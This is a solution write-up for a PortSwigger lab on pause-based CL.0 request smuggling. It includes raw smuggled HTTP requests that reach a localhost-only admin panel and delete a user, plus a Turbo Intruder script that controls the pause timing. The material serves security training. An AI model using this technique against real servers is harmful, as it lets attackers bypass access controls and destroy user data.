#  Server-side pause-based request smuggling

## 📌 Lab Details
- **Title**: Server-side pause-based request smuggling
- **Difficulty**: Expert
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/15658ad1d00ccc9b99c99507c53dd7ec3472c9a0102ad3894e6c713f472630c8?referrer=%2fweb-security%2frequest-smuggling%2fbrowser%2fpause-based-desync%2flab-server-side-pause-based-request-smuggling

## 🔍 Summary
Pause-based server-side request smuggling (CL.0) exploits a timing mismatch between a front-end proxy and a back-end that handle persistent connections differently. Using Turbo Intruder you send headers, pause (≈61s), then send a nested request; the backend treats the later bytes as a new request (e.g., Host: localhost → /admin/)

## 🛠 Steps to Solve
**Identify a desync vector**:
1. In Burp, notice from the `Server` response header that the lab is using `Apache 2.4.52`. This version of Apache is potentially vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects.
2. In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, `GET /resources`. Observe that you are redirected to `/resources/`.
3. Send the request to **Turbo Intruder**.
4. Change request method to **POST** and change the `Connection` header to `keep-alive`.
5. Add a complete `GET /admin` request to the body of the main request.
   ```sh
   POST /resources HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: keep-alive
   Content-Type: application/x-www-form-urlencoded
   Content-Length: CORRECT

   GET /admin/ HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   ```
6. Enter the following script of Python. This issues the request twice, pausing for 61 seconds after the `\r\n\r\n` sequence at the end of the headers:
   ```sh
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

       engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
       engine.queue(target.req)

   def handleResponse(req, interesting):
       table.add(req)
   ```
7. Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table:
   - The first entry is the `POST /resources` request, which triggered a redirect to `/resources/` as normal.
   - The second entry is a response to the `GET /admin/` request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability.
  
**Exploit**:
1. In Turbo Intruder, go back to the attack configuration screen. In your smuggled request, change the `Host` header to `localhost` and relaunch the attack.
2. After 61 seconds, notice that you have now successfully accessed the admin panel.
3. Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:
   - The action attribute(`/admin/delete`).
   - The name of the input(`username`).
   - The `csrf` token.
   - The `cookie` of the user.
4. Go back to the attack configuration screen. Use these details to replicate the request that would be issued when submitting the form. The result should look something like this:
   ```sh
   POST /resources HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: keep-alive
   Content-Type: application/x-www-form-urlencoded
   Content-Length: CORRECT

   POST /admin/delete/ HTTP/1.1
   Host: localhost
   Cookie: session=YOUR-COOKIE
   Content-Length: 53

   csrf=YOUR-CSRF-TOKEN&username=carlos
   ```
5. To prevent Turbo Intruder from pausing after both occurrences of \r\n\r\n in the request, update the pauseMarker argument so that it only matches the end of the first set of headers, for example:
   ```sh
   pauseMarker=['\r\n\r\nPOST']
   ```
6. Launch the attack. After 61 seconds, the lab is solved.

## 📖 Key Takeaways
- Attack relies on timing (pause after headers) and connection reuse (keep-alive).
- **Turbo Intruder** is required to control the precise pause (`pauseMarker` + `pauseTime`).
- Changing `Host` to `localhost` lets you reach internal admin endpoints via the back-end.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/eb555569-b7b8-4117-b2d1-82ca0828c182" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/afd583a1-9ca3-4a5d-ba88-ced297d44feb" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5244c72c-e779-4149-9c24-a3d651f48e77" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0c6814a1-9b56-4650-ad93-149e918f49b9" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ef4e2bcd-696a-4e45-a5df-0e6c8ed7677d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1866c626-9532-409c-b45c-5314c621c230" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b3421239-4a26-4bea-aca2-38f5dc3e680b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/76491700-508d-47f7-9d80-104dfc764fa4" />
